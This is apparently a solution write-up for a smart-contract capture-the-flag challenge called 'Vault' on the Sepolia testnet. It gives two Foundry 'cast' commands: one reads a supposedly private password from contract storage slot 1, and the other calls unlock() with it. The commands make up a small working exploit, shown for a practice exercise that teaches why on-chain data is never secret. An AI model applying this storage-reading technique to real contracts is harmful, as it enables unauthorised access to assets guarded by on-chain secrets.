# Vault Solution

1) Retrieve the `password`:

```
cast storage `ìnstanceAddress` 0x1 --rpc-url $SEPOLIA_RPC_URL
```

2) Call `unlock()`:

```
cast send `ìnstanceAddress` "unlock(bytes32)" `password` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
